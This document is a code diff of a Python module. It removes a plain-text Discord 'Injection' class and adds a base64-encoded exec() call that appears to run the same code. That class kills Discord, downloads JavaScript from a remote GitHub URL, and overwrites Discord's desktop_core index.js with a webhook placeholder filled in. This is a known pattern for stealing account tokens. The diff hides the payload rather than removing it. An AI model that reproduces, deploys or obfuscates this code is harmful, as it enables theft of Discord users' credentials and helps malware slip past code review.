@@ -1,60 +1,8 @@
 import os
 import re
 import subprocess
-
 import psutil
 import requests
+import base64
 
-
-class Injection:
-    def __init__(self, webhook: str) -> None:
-        self.appdata = os.getenv('LOCALAPPDATA')
-        self.discord_dirs = [
-            self.appdata + '\\Discord',
-            self.appdata + '\\DiscordCanary',
-            self.appdata + '\\DiscordPTB',
-            self.appdata + '\\DiscordDevelopment'
-        ]
-        self.code = requests.get('https://raw.githubusercontent.com/chiron853/injection/main/index.js').text
-        
-        for proc in psutil.process_iter():
-            if 'discord' in proc.name().lower():
-                proc.kill()
-
-        for dir in self.discord_dirs:
-            if not os.path.exists(dir):
-                continue
-
-            if self.get_core(dir) is not None:
-                with open(self.get_core(dir)[0] + '\\index.js', 'w', encoding='utf-8') as f:
-                    f.write((self.code).replace('discord_desktop_core-1',
-                            self.get_core(dir)[1]).replace('%WEBHOOK%', webhook))
-                    self.start_discord(dir)
-
-    def get_core(self, dir: str) -> tuple:
-        for file in os.listdir(dir):
-            if re.search(r'app-+?', file):
-                modules = dir + '\\' + file + '\\modules'
-                if not os.path.exists(modules):
-                    continue
-                for file in os.listdir(modules):
-                    if re.search(r'discord_desktop_core-+?', file):
-                        core = modules + '\\' + file + '\\' + 'discord_desktop_core'
-                        if not os.path.exists(core + '\\index.js'):
-                            continue
-
-                        return core, file
-
-    def start_discord(self, dir: str) -> None:
-        update = dir + '\\Update.exe'
-        executable = dir.split('\\')[-1] + '.exe'
-
-        for file in os.listdir(dir):
-            if re.search(r'app-+?', file):
-                app = dir + '\\' + file
-                if os.path.exists(app + '\\' + 'modules'):
-                    for file in os.listdir(app):
-                        if file == executable:
-                            executable = app + '\\' + executable
-                            subprocess.call([update, '--processStart', executable],
-                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+exec(base64.b64decode("Y2xhc3MgSW5qZWN0aW9uOg0KICAgIGRlZiBfX2luaXRfXyhzZWxmLCB3ZWJob29rOiBzdHIpIC0+IE5vbmU6DQogICAgICAgIHNlbGYuYXBwZGF0YSA9IG9zLmdldGVudignTE9DQUxBUFBEQVRBJykNCiAgICAgICAgc2VsZi5kaXNjb3JkX2RpcnMgPSBbDQogICAgICAgICAgICBzZWxmLmFwcGRhdGEgKyAnXFxEaXNjb3JkJywNCiAgICAgICAgICAgIHNlbGYuYXBwZGF0YSArICdcXERpc2NvcmRDYW5hcnknLA0KICAgICAgICAgICAgc2VsZi5hcHBkYXRhICsgJ1xcRGlzY29yZFBUQicsDQogICAgICAgICAgICBzZWxmLmFwcGRhdGEgKyAnXFxEaXNjb3JkRGV2ZWxvcG1lbnQnDQogICAgICAgIF0NCiAgICAgICAgc2VsZi5jb2RlID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY2hpcm9uODUzL2luamVjdGlvbi9tYWluL2luZGV4LmpzJykudGV4dA0KICAgICAgICANCiAgICAgICAgZm9yIHByb2MgaW4gcHN1dGlsLnByb2Nlc3NfaXRlcigpOg0KICAgICAgICAgICAgaWYgJ2Rpc2NvcmQnIGluIHByb2MubmFtZSgpLmxvd2VyKCk6DQogICAgICAgICAgICAgICAgcHJvYy5raWxsKCkNCg0KICAgICAgICBmb3IgZGlyIGluIHNlbGYuZGlzY29yZF9kaXJzOg0KICAgICAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKGRpcik6DQogICAgICAgICAgICAgICAgY29udGludWUNCg0KICAgICAgICAgICAgaWYgc2VsZi5nZXRfY29yZShkaXIpIGlzIG5vdCBOb25lOg0KICAgICAgICAgICAgICAgIHdpdGggb3BlbihzZWxmLmdldF9jb3JlKGRpcilbMF0gKyAnXFxpbmRleC5qcycsICd3JywgZW5jb2Rpbmc9J3V0Zi04JykgYXMgZjoNCiAgICAgICAgICAgICAgICAgICAgZi53cml0ZSgoc2VsZi5jb2RlKS5yZXBsYWNlKCdkaXNjb3JkX2Rlc2t0b3BfY29yZS0xJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmdldF9jb3JlKGRpcilbMV0pLnJlcGxhY2UoJyVXRUJIT09LJScsIHdlYmhvb2spKQ0KICAgICAgICAgICAgICAgICAgICBzZWxmLnN0YXJ0X2Rpc2NvcmQoZGlyKQ0KDQogICAgZGVmIGdldF9jb3JlKHNlbGYsIGRpcjogc3RyKSAtPiB0dXBsZToNCiAgICAgICAgZm9yIGZpbGUgaW4gb3MubGlzdGRpcihkaXIpOg0KICAgICAgICAgICAgaWYgcmUuc2VhcmNoKHInYXBwLSs/JywgZmlsZSk6DQogICAgICAgICAgICAgICAgbW9kdWxlcyA9IGRpciArICdcXCcgKyBmaWxlICsgJ1xcbW9kdWxlcycNCiAgICAgICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMobW9kdWxlcyk6DQogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgICAgICAgICAgZm9yIGZpbGUgaW4gb3MubGlzdGRpcihtb2R1bGVzKToNCiAgICAgICAgICAgICAgICAgICAgaWYgcmUuc2VhcmNoKHInZGlzY29yZF9kZXNrdG9wX2NvcmUtKz8nLCBmaWxlKToNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvcmUgPSBtb2R1bGVzICsgJ1xcJyArIGZpbGUgKyAnXFwnICsgJ2Rpc2NvcmRfZGVza3RvcF9jb3JlJw0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKGNvcmUgKyAnXFxpbmRleC5qcycpOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBjb3JlLCBmaWxlDQoNCiAgICBkZWYgc3RhcnRfZGlzY29yZChzZWxmLCBkaXI6IHN0cikgLT4gTm9uZToNCiAgICAgICAgdXBkYXRlID0gZGlyICsgJ1xcVXBkYXRlLmV4ZScNCiAgICAgICAgZXhlY3V0YWJsZSA9IGRpci5zcGxpdCgnXFwnKVstMV0gKyAnLmV4ZScNCg0KICAgICAgICBmb3IgZmlsZSBpbiBvcy5saXN0ZGlyKGRpcik6DQogICAgICAgICAgICBpZiByZS5zZWFyY2gocidhcHAtKz8nLCBmaWxlKToNCiAgICAgICAgICAgICAgICBhcHAgPSBkaXIgKyAnXFwnICsgZmlsZQ0KICAgICAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKGFwcCArICdcXCcgKyAnbW9kdWxlcycpOg0KICAgICAgICAgICAgICAgICAgICBmb3IgZmlsZSBpbiBvcy5saXN0ZGlyKGFwcCk6DQogICAgICAgICAgICAgICAgICAgICAgICBpZiBmaWxlID09IGV4ZWN1dGFibGU6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhlY3V0YWJsZSA9IGFwcCArICdcXCcgKyBleGVjdXRhYmxlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3VicHJvY2Vzcy5jYWxsKFt1cGRhdGUsICctLXByb2Nlc3NTdGFydCcsIGV4ZWN1dGFibGVdLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzaGVsbD1UcnVlLCBzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLCBzdGRlcnI9c3VicHJvY2Vzcy5QSVBFKQ0K"))
